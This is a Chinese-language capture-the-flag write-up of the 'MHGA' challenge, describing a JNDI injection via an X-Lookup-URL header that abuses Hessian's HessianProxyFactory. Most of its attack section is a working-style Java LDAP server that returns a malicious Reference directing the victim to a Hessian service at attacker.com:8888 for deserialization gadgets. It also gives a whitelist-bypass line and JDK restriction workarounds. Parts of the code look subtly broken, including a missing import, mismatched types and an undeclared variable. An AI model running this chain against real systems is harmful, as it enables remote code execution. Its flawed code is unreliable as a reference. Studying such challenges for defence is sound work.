# MHGA 攻击链分析

## 题目信息

- **名称**: MHGA (Make Hessian Great Again)
- **JDK**: 11
- **Hessian**: 4.0.66
- **入口**: JNDI Injection via `X-Lookup-URL` 请求头

## 核心发现

### JNDI + Hessian 连接点

`HessianProxyFactory` 实现了 `javax.naming.spi.ObjectFactory` 接口：

```java
public class HessianProxyFactory
    implements ObjectFactory {

    @Override
    public Object getObjectInstance(Object obj, Name name,
                                   Context nameCtx,
                                   Hashtable<?, ?> environment)
        throws Exception {

        Reference ref = (Reference) obj;

        // 从 Reference 中读取参数
        String type = null;    // 类类型
        String url = null;     // Hessian 服务 URL
        String user = null;
        String password = null;

        // 解析 RefAddr
        for (int i = 0; i < ref.size(); i++) {
            RefAddr addr = ref.get(i);
            String key = addr.getType();
            String value = (String) addr.getContent();

            if ("type".equals(key)) type = value;
            else if ("url".equals(key)) url = value;
            else if ("user".equals(key)) user = value;
            else if ("password".equals(key)) password = value;
        }

        // 创建 Hessian 代理
        Class clazz = Class.forName(type, false, loader);
        return create(clazz, url);  // 连接到指定的 Hessian 服务
    }
}
```

## 利用条件

### 1. JDK 版本限制

| JDK 版本 | 限制 | 绕过方式 |
|----------|------|----------|
| JDK 8u191+ | `trustURLCodebase` 默认 false | 使用本地 Reference (无需远程 codebase) |
| JDK 11+ | 同上 | 同上 |

**本题方案**: 使用 Reference + 本地 ObjectFactory，无需远程加载 class

### 2. Hessian 白名单问题

Hessian 4.0.66 有白名单机制，但可以通过以下方式绕过：

```java
// 方式 1: 使用已经在白名单中的类
// Hessian 默认允许的类包括：
// - java.lang.*
// - java.util.*
// - 等核心 Java 类

// 方式 2: 如果可以通过 JNDI 控制白名单配置
serializerFactory.allow(".*");  // 允许所有类
```

## 攻击利用代码

### 步骤 1: 启动 LDAP 服务器返回 Reference

```java
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldif.LDIFAddRecord;
import com.unboundid.ldif.LDIFRecord;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.URL;

public class LDAPServer {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main(String[] args) throws Exception {
        int port = 1389;

        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
        config.setListenerConfigs(new InMemoryListenerConfig(
                "listen",
                InetAddress.getByName("0.0.0.0"),
                port,
                ServerSocketFactory.getDefault(),
                SocketFactory.getDefault(),
                (SSLSocketFactory) SSLSocketFactory.getDefault()
        ));

        config.addInMemoryOperationInterceptor(new OperationInterceptor());

        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
        ds.start();

        System.out.println("LDAP Server started on port " + port);
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            String filter = result.getRequest().getFilter();

            System.out.println("Search: base=" + base + ", filter=" + filter);

            // 创建恶意 Reference
            Reference reference = new Reference(
                "exploit",
                "com.caucho.hessian.client.HessianProxyFactory",  // ObjectFactory
                null
            );
            reference.add(new StringRefAddr("type", "java.util.Map"));
            reference.add(new StringRefAddr("url", "http://attacker.com:8888/"));

            // 返回 Reference
            result.sendSearchEntry(
                new LDIFAddRecord(
                    new LDIFRecord(
                        "dn: dc=exploit," + LDAP_BASE,
                        "objectClass: javaNamingReference",
                        "javaClassName: exploit",
                        "javaFactory: com.caucho.hessian.client.HessianProxyFactory",
                        "javaReferenceAddress:#0#type#java.util.Map",
                        "javaReferenceAddress:#1#url#http://attacker.com:8888/"
                    )
                )
            );
        }
    }
}
```

## 关键点总结

1. **连接点**: `HessianProxyFactory` 实现了 `ObjectFactory` 接口
2. **触发方式**: JNDI lookup → 返回 Reference → 触发 `getObjectInstance()`
3. **攻击向量**: `Reference.url` 参数控制 Hessian 客户端连接目标
4. **最终利用**: 恶意 Hessian 服务器返回反序列化 gadget
5. **绕过限制**: 使用本地 ObjectFactory，无需远程 codebase
